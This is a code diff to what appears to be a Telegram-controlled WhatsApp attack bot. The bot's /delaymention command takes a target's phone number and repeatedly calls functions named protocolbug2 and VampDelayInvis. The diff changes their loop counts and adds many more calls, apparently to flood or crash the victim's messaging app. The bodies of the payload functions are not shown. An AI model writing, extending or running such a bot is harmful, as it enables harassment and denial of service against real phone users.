@@ -1583,15 +1583,7 @@ async function VampOri(target) {
 
 }
 async function VampDelayInvis(target) {
-    for (let i = 0; i <= 800; i++) {
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
+    for (let i = 0; i <= 5; i++) {
     await VampBroadcast(target, mention = true)
     }
 
@@ -2101,8 +2093,51 @@ bot.onText(/\/delaymention(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 500; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
         await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
